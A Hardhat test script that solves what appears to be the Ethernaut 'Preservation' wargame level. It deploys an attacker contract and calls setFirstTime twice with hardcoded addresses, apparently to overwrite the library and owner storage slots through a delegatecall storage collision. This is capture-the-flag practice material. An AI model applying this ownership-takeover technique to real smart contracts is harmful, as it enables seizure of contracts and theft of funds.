import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
const BN = BigNumber;

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Preservation`);
  const challengeAddress = await createChallenge(
    `0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  const attackerFactory = await ethers.getContractFactory('PreservationAttacker')
  let attacker = await attackerFactory.connect(eoa).deploy()

  await challenge.connect(eoa).setFirstTime(BN.from("0x652152e23E82aFdaCa2Ac1a5535269281b5BeF3b")) // attacker address
  console.log("library1:",await ethers.provider.getStorageAt(challenge.address,0))
  
  await challenge.connect(eoa).setFirstTime(BN.from("0x6B06820261843672e0ca3DC2797b17d779a8493D")) // eoa address
  console.log("owner:",await ethers.provider.getStorageAt(challenge.address,2))

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
